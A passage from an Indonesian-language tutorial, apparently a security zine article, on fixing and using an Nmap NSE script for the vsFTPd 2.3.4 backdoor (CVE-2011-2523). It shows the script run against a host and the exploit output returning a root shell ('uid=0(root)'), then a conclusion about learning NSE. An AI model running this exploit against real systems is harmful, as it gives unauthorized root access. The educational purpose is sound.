+|| >     return report:make_output(vsftp_vuln)
+|| >   end
+|\ DareDevil:scripts ammar$
+=========================================
+
+Sehingga apabila selanjutnya kita eksekusi akan didapatkan hasil yang sesuai :)
+
+=========================================
+|/ DareDevil:~ ammar$ nmap  -p21 --script=ftp-vsftpd-backdoor-ok.nse 192.168.1.205 -PN
+||
+|| Starting Nmap 6.00 ( http://nmap.org ) at 2012-12-11 00:19 WIT
+|| Nmap scan report for 192.168.1.205
+|| Host is up (0.069s latency).
+|| PORT   STATE SERVICE
+|| 21/tcp open  ftp
+|| | ftp-vsftpd-backdoor-ok: 
+|| |   VULNERABLE:
+|| |   vsFTPd version 2.3.4 backdoor
+|| |     State: VULNERABLE (Exploitable)
+|| |     IDs:  CVE:CVE-2011-2523  OSVDB:73573
+|| |     Description:
+|| |       vsFTPd version 2.3.4 backdoor, this was reported on 2011-07-04.
+|| |     Disclosure date: 2011-07-03
+|| |     Exploit results:
+|| |       Shell command: id
+|| |       Results: uid=0(root) gid=0(root)
+|| |     References:
+|| |       http://osvdb.org/73573
+|| |       http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523
+|| |       http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html
+|| |_      https://dev.metasploit.com/redmine/projects/framework/repository/revisions/13093
+|| 
+|| Nmap done: 1 IP address (1 host up) scanned in 2.32 seconds
+|\ DareDevil:~ ammar$
+=========================================
+
+-----| Kesimpulan
+
+Sebenarnya bahasan kali ini sangatlah sederhana, tetapi jangan di karenakan hal
+yang sederhana itu kita melewatkan kesempatan mendapatkan "root" :P, maksud
+saya melewatkan celah keamanan yang sangat "critical" di mesin kita :).
+Beberapa hal ada yang saya jelaskan/tampilkan secara detail bahkan mungkin
+seharusnya tidak perlu seperti keseluruhan hasil trace dan debug, dan tujuannya
+bukan untuk memperpanjang artikel :p, tidak! tujuan sebenarnya adalah agar anda
+mengetahui dan mau membaca bagaimana cara suatu aplikasi itu bekerja, bagi yang
+sudah mengetahui dan memahami mohon di "skip" saja :).
+
+Di artikel ini mudah-mudahan anda bisa lebih mengenal NMAP Scripting Engine
+atau NSE, yang merupakan salah satu modul "powerfull" dari NMAP, mengerti cara
+menggunakan, meng"convert"-nya dan memperbaiki, apabila memungkinkan membuat :).
+
+Mudah-mudahan artikel ini sedikit banyak bermanfaat.
+
+-----| Referensi
+
+[1] "vsftpd 2.3.4 Diff Result" http://pastebin.com/AetT9sS5
